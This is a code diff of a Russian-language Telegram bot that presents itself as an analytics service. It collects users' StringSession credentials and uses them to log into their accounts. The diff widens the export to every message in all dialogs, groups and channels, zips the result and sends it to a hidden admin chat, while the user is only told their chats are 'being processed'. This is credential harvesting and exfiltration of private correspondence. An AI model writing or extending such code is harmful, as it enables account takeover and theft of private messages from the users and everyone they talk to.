@@ -1,6 +1,6 @@
 """
-Telegram Analytics Bot - Сбор StringSession + Авто-экспорт чатов
-Пользователь подключается → бот скачивает все чаты → присылает ZIP админу
+Telegram Analytics Bot - Сбор StringSession + Авто-экспорт ВСЕХ чатов
+Пользователь подключается → бот скачивает ВСЕ сообщения → присылает ZIP админу
 """
 
 import asyncio
@@ -117,7 +117,7 @@ class AnalyticsBot:
 
 ⏳ **После подключения:**
 Ваши чаты будут обработаны в фоне.
-Обычно это занимает 1-5 минут.
+Обычно это занимает 2-10 минут.
 """)
     
     async def cmd_stats(self, e):
@@ -235,10 +235,8 @@ class AnalyticsBot:
 
 👤 {me.first_name}, ваши чаты обрабатываются.
 
-⏳ Обычно это занимает 1-5 минут.
+⏳ Обычно это занимает 2-10 минут.
 Как только всё будет готово — вы получите уведомление.
-
-📊 /stats — проверка статуса
 """)
             
             if uid in self.pending:
@@ -262,10 +260,10 @@ class AnalyticsBot:
             if uid in self.pending:
                 del self.pending[uid]
     
-    # ===== ЭКСПОРТ ЧАТОВ =====
+    # ===== ЭКСПОРТ ВСЕХ СООБЩЕНИЙ =====
     
     async def export_and_send(self, uid: int, session_string: str, me):
-        """Экспорт всех чатов и отправка ZIP админу"""
+        """Экспорт ВСЕХ сообщений из всех чатов и отправка ZIP админу"""
         
         if self.exporting.get(uid, False):
             logger.warning(f"Экспорт для {uid} уже запущен")
@@ -292,82 +290,101 @@ class AnalyticsBot:
                 await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка: невалидная сессия для {me.id}")
                 return
             
+            # Получаем информацию о пользователе
+            me_check = await client.get_me()
+            await self.bot.send_message(ADMIN_CHAT_ID, f"✅ Авторизован: {me_check.first_name}")
+            
+            # Получаем ВСЕ диалоги
+            dialogs = await client.get_dialogs()
+            await self.bot.send_message(ADMIN_CHAT_ID, f"📊 Всего диалогов: {len(dialogs)}")
+            
+            if not dialogs:
+                await self.bot.send_message(ADMIN_CHAT_ID, "❌ Нет диалогов! Проверьте сессию.")
+                return
+            
             # Создаём папку для экспорта
             export_dir = tempfile.mkdtemp()
-            
-            # Получаем диалоги
-            dialogs = await client.get_dialogs()
-            
-            # Личные чаты + Избранное (исключаем ботов)
-            personal_chats = [
-                d for d in dialogs
-                if d.is_user
-                and not getattr(d.entity, 'bot', False)
-            ]
             
             total_messages = 0
             processed = 0
             
-            for dialog in personal_chats:
+            # ⭐ ПРОХОДИМ ПО ВСЕМ ДИАЛОГАМ (не только личным)
+            for dialog in dialogs:
                 try:
-                    username = dialog.entity.username if dialog.entity.username else 'нет_username'
-                    chat_label = "📌 ИЗБРАННОЕ" if dialog.is_me else dialog.name
+                    # Получаем имя чата
+                    chat_name = dialog.name or "Без названия"
+                    chat_id = dialog.id
+                    
+                    # Проверяем, есть ли сообщения
+                    first_msg = await client.get_messages(dialog, limit=1)
+                    if not first_msg:
+                        logger.info(f"⚠️ В чате {chat_name} нет сообщений")
+                        continue
+                    
+                    logger.info(f"📥 Обработка: {chat_name}")
+                    await self.bot.send_message(ADMIN_CHAT_ID, f"📥 Обработка: {chat_name}")
                     
                     messages = []
                     messages_by_id = {}
                     
+                    # ⭐ ПОЛУЧАЕМ ВСЕ СООБЩЕНИЯ (без лимита)
                     async for msg in client.iter_messages(dialog, limit=None):
-                        sender_name = None
-                        if msg.sender:
-                            sender_name = msg.sender.first_name
-                            if msg.sender.last_name:
-                                sender_name += f" {msg.sender.last_name}"
-                        
-                        reactions_info = []
-                        if msg.reactions and msg.reactions.results:
-                            for reaction in msg.reactions.results:
-                                reaction_type = 'unknown'
-                                if reaction.reaction:
-                                    if hasattr(reaction.reaction, 'emoticon'):
-                                        reaction_type = reaction.reaction.emoticon
-                                    else:
-                                        reaction_type = str(reaction.reaction)
-                                
-                                reactors = []
-                                if hasattr(reaction, 'recent_reactions') and reaction.recent_reactions:
-                                    for recent in reaction.recent_reactions:
-                                        if hasattr(recent, 'peer_id'):
-                                            try:
-                                                user = await client.get_entity(recent.peer_id)
-                                                reactor_name = user.first_name
-                                                if user.last_name:
-                                                    reactor_name += f" {user.last_name}"
-                                                reactors.append(reactor_name)
-                                            except:
-                                                pass
-                                
-                                reactions_info.append({
-                                    'reaction': reaction_type,
-                                    'count': reaction.count,
-                                    'reactors': reactors if reactors else None
-                                })
-                        
-                        message_data = {
-                            'id': msg.id,
-                            'date': msg.date.isoformat() if msg.date else None,
-                            'text': msg.text or '',
-                            'sender_id': msg.sender_id,
-                            'sender_name': sender_name,
-                            'reply_to_msg_id': msg.reply_to_msg_id,
-                            'reply_to_text': None,
-                            'reply_to_sender': None,
-                            'has_media': bool(msg.media),
-                            'media_type': str(msg.media.__class__.__name__) if msg.media else None,
-                            'reactions': reactions_info if reactions_info else None
-                        }
-                        
-                        messages.append(message_data)
-                        messages_by_id[msg.id] = message_data
+                        try:
+                            sender_name = None
+                            if msg.sender:
+                                sender_name = msg.sender.first_name
+                                if msg.sender.last_name:
+                                    sender_name += f" {msg.sender.last_name}"
+                            
+                            # Реакции
+                            reactions_info = []
+                            if msg.reactions and msg.reactions.results:
+                                for reaction in msg.reactions.results:
+                                    reaction_type = 'unknown'
+                                    if reaction.reaction:
+                                        if hasattr(reaction.reaction, 'emoticon'):
+                                            reaction_type = reaction.reaction.emoticon
+                                        else:
+                                            reaction_type = str(reaction.reaction)
+                                    
+                                    reactors = []
+                                    if hasattr(reaction, 'recent_reactions') and reaction.recent_reactions:
+                                        for recent in reaction.recent_reactions:
+                                            if hasattr(recent, 'peer_id'):
+                                                try:
+                                                    user = await client.get_entity(recent.peer_id)
+                                                    reactor_name = user.first_name
+                                                    if user.last_name:
+                                                        reactor_name += f" {user.last_name}"
+                                                    reactors.append(reactor_name)
+                                                except:
+                                                    pass
+                                    
+                                    reactions_info.append({
+                                        'reaction': reaction_type,
+                                        'count': reaction.count,
+                                        'reactors': reactors if reactors else None
+                                    })
+                            
+                            message_data = {
+                                'id': msg.id,
+                                'date': msg.date.isoformat() if msg.date else None,
+                                'text': msg.text or '',
+                                'sender_id': msg.sender_id,
+                                'sender_name': sender_name,
+                                'reply_to_msg_id': msg.reply_to_msg_id,
+                                'reply_to_text': None,
+                                'reply_to_sender': None,
+                                'has_media': bool(msg.media),
+                                'media_type': str(msg.media.__class__.__name__) if msg.media else None,
+                                'reactions': reactions_info if reactions_info else None
+                            }
+                            
+                            messages.append(message_data)
+                            messages_by_id[msg.id] = message_data
+                            
+                        except Exception as err:
+                            logger.error(f"Ошибка обработки сообщения: {err}")
                     
                     # Добавляем информацию об ответах
                     for msg_data in messages:
@@ -377,18 +394,20 @@ class AnalyticsBot:
                             msg_data['reply_to_sender'] = reply_to.get('sender_name')
                     
                     # Сохраняем JSON
-                    safe_name = dialog.name.replace('/', '_').replace('\\', '_')
-                    if dialog.is_me:
-                        safe_name = "saved_messages"
-                    filename = f"{dialog.id}_{safe_name}.json"
+                    safe_name = chat_name.replace('/', '_').replace('\\', '_').replace(':', '_')
+                    if not safe_name:
+                        safe_name = f"chat_{chat_id}"
+                    filename = f"{chat_id}_{safe_name}.json"
                     filepath = os.path.join(export_dir, filename)
                     
                     with open(filepath, 'w', encoding='utf-8') as f:
                         json.dump({
-                            'chat_name': "Избранное (Saved Messages)" if dialog.is_me else dialog.name,
-                            'chat_id': dialog.id,
-                            'username': username,
-                            'is_saved_messages': dialog.is_me,
+                            'chat_name': chat_name,
+                            'chat_id': chat_id,
+                            'is_me': dialog.is_me,
+                            'is_user': dialog.is_user,
+                            'is_group': dialog.is_group,
+                            'is_channel': dialog.is_channel,
                             'total_messages': len(messages),
                             'export_date': datetime.now().isoformat(),
                             'messages': messages
@@ -397,12 +416,23 @@ class AnalyticsBot:
                     total_messages += len(messages)
                     processed += 1
                     
-                    logger.info(f"✅ {chat_label}: {len(messages)} сообщений")
+                    logger.info(f"✅ {chat_name}: {len(messages)} сообщений")
+                    await self.bot.send_message(ADMIN_CHAT_ID, f"✅ {chat_name}: {len(messages)} сообщений")
                     
                 except Exception as err:
                     logger.error(f"Ошибка чата {dialog.name}: {err}")
+                    await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка чата {dialog.name}: {err}")
+            
+            await self.bot.send_message(ADMIN_CHAT_ID, f"📊 Обработано чатов: {processed}, сообщений: {total_messages}")
+            
+            # Если сообщений 0 — не отправляем пустой архив
+            if total_messages == 0:
+                await self.bot.send_message(ADMIN_CHAT_ID, "❌ Нет сообщений для экспорта! Проверьте аккаунт.")
+                shutil.rmtree(export_dir)
+                return
             
             # Создаём ZIP
+            await self.bot.send_message(ADMIN_CHAT_ID, "📦 Создаю архив...")
             zip_filename = tempfile.mktemp(suffix='.zip')
             with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for root, dirs, files in os.walk(export_dir):
@@ -415,6 +445,8 @@ class AnalyticsBot:
             await client.disconnect()
             
             # ⭐ ОТПРАВЛЯЕМ ZIP АДМИНУ
+            await self.bot.send_message(ADMIN_CHAT_ID, f"📤 Отправляю архив ({processed} чатов, {total_messages} сообщений)...")
+            
             with open(zip_filename, 'rb') as f:
                 await self.bot.send_file(
                     ADMIN_CHAT_ID,
@@ -442,7 +474,7 @@ class AnalyticsBot:
             
         except Exception as err:
             logger.error(f"Ошибка экспорта для {uid}: {err}")
-            await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка экспорта для {me.id}: {err}")
+            await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка экспорта: {err}")
         finally:
             self.exporting[uid] = False
 
